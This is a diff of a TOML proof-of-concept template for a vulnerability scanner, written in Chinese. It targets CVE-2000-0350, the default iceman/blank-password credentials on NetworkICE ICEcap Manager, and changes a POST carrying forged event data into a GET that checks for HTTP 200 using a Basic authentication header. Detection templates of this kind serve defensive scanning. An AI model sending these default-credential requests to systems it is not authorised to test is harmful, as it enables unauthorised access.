@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "NetworkICE ICEcap Manager 2.0.23及之前版本存在调试功能默认开启漏洞(CVE-2000-0350)。PoC通过HTTP POST向目标8082端口发送包含默认凭据(iceman/空密码)Basic认证头及伪造事件数据的请求，验证远程攻击者能否利用默认管理凭据绕过认证提交未加密事件。参考: ExploitDB 19922, SecurityFocus BID 1216"
+description = "验证 NetworkICE ICEcap Manager 是否存在默认用户名 iceman 空密码漏洞。向目标 8082 端口发送 HTTP GET 请求，使用默认凭据 iceman 空密码进行认证，若返回 200 则确认存在默认凭据漏洞。"
 id = "POC-AVE-2000-0304"
-name = "CVE-2000-0350 PoC - NetworkICE ICECap Manager Default Credentials"
+name = "NetworkICE ICEcap Manager 默认凭据 PoC"
 severity = "medium"
 tags = ["ave-2000-0304"]
 vuln_id = [
@@ -11,36 +11,18 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}:8082/"
+method = "GET"
+path = "/{{BaseURL}}/"
 protocol = "http"
-
-[poc.requests.body]
-content = "accountName=iceman&issueID=100005&issueName=Exploit&severity=1&targetNetAddress=0.0.0.1&targetDNSName=test.host.com&detectorNetAddress=0.0.0.1&detectorNetBIOSName=SENSOR&detectorMacAddress=000000000000&intruderNetAddress=255.255.255.255&detectorType=3&startTime=2024-01-01T00:00:00&parameter=Test"
-type = "raw"
 
 [poc.requests.headers]
 Authorization = "Basic aWNlbWFuOg=="
-Content-Type = "application/x-www-form-urlencoded"
-User-Agent = "netice-alerter/1.0"
+Host = "{{Hostname}}:8082"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    200,
-    202,
-]
+status = [200]
 type = "status"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "OK",
-    "200",
-    "202",
-]
